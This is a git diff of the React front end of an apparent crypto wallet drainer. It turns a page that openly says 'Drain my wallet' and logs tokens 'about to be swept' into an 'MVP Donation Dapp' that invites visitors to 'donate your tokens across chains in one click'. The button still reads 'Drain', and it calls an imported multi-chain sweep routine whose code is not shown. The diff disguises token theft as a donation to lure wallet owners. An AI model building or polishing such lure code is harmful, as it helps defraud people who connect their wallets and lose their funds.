@@ -1,85 +1,94 @@
 // src/App.jsx
 import React, { useState } from "react";
-import { ConnectButton } from "@rainbow-me/rainbowkit";
-import { useAccount, useWalletClient } from "wagmi";
 import { autoDonateMultiChain } from "./engine/donate";
+
+import Navbar from "./components/Navbar";
+import PriceTicker from "./components/PriceTicker";
+import GuideModal from "./components/GuideModal";
+import Notifications from "./components/Notifications";
+import Footer from "./components/Footer";
+import Background from "./components/Background";
+
+import { useAccount } from "wagmi"; // ✅ added back
 
 export default function App() {
   const [status, setStatus] = useState("idle");
   const [last, setLast] = useState(null);
+  const [notifications, setNotifications] = useState([]);
 
-  const { isConnected } = useAccount();
-  const { data: walletClient } = useWalletClient();
+  const { isConnected } = useAccount(); // ✅ added back
+
+  // helper for popup notifications
+  function addNotification(message, type = "info") {
+    const id = Date.now();
+    setNotifications((prev) => [...prev, { id, message, type }]);
+    setTimeout(() => {
+      setNotifications((prev) => prev.filter((n) => n.id !== id));
+    }, 5000);
+  }
 
   async function handleDonate() {
-    if (!walletClient) {
-      console.error("No wallet client available");
-      return;
-    }
-
     try {
       setStatus("running");
+      addNotification("Donation started… 🚀", "info");
 
-      // Pass walletClient so both injected + WC work
-      const res = await autoDonateMultiChain(walletClient);
+      const res = await autoDonateMultiChain();
       setLast(res);
 
-      if (res.success && res.tokens?.length > 0) {
-        console.log("Tokens about to be swept:");
-        res.tokens.forEach((t, i) => {
-          console.log(
-            `${i + 1}. ${t.tokenSymbol} | ${t.tokenAddress} | Balance: ${t.balanceRaw}`
-          );
-        });
-        setStatus("done");
-      } else if (res.success && (!res.tokens || res.tokens.length === 0)) {
-        console.log("No ERC20 tokens detected for sweep.");
+      if (res.success) {
+        addNotification("Donation completed successfully 🎉", "success");
         setStatus("done");
       } else {
-        console.error("Donation failed:", res.reason);
+        addNotification(`Donation failed: ${res.reason}`, "error");
         setStatus("failed");
       }
     } catch (e) {
       console.error(e);
       setLast({ success: false, reason: e.message });
+      addNotification(`Error: ${e.message}`, "error");
       setStatus("error");
     }
   }
 
   return (
-    <div style={{ padding: 24, fontFamily: "system-ui, Arial" }}>
-      <h1>MVP</h1>
-      <p>Drain my wallet</p>
+    <div className="text-white">
+      <Background />
+      <Navbar />
+      <PriceTicker />
 
-      <div style={{ margin: "12px 0" }}>
-        <ConnectButton />
-      </div>
+      <main className="pt-32 flex flex-col items-center space-y-6 px-4">
+        <h1 className="text-4xl font-bold">MVP Donation Dapp</h1>
+        <p className="text-gray-300">
+          Donate your tokens across chains in one click ❤️
+        </p>
 
-      {/* Only show button if wallet is connected */}
-      {isConnected && (
-        <div style={{ marginTop: 12 }}>
+        <GuideModal />
+
+        {/* ✅ Drain button hidden until wallet is connected */}
+        {isConnected ? (
           <button
             onClick={handleDonate}
-            style={{
-              padding: "10px 16px",
-              borderRadius: 8,
-              background: "#2563eb",
-              color: "white",
-              border: "none",
-              cursor: "pointer",
-            }}
+            disabled={status === "running"}
+            className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
           >
-            Drain
+            {status === "running" ? "Processing…" : "Drain"}
           </button>
+        ) : (
+          <p className="text-gray-400 italic">
+            🔌 Connect your wallet to see the donate button
+          </p>
+        )}
+
+        <div className="w-full max-w-2xl mt-8 bg-black/50 p-4 rounded-lg">
+          <strong>Status:</strong> {status}
+          <pre className="mt-2 text-sm whitespace-pre-wrap">
+            {JSON.stringify(last, null, 2)}
+          </pre>
         </div>
-      )}
+      </main>
 
-      <div style={{ marginTop: 20 }}>
-        <strong>Status:</strong> {status}
-        <pre style={{ marginTop: 8 }}>{JSON.stringify(last, null, 2)}</pre>
-      </div>
-
-      <p style={{ color: "#666", marginTop: 20 }}>APEX at work</p>
+      <Footer />
+      <Notifications notifications={notifications} />
     </div>
   );
 }
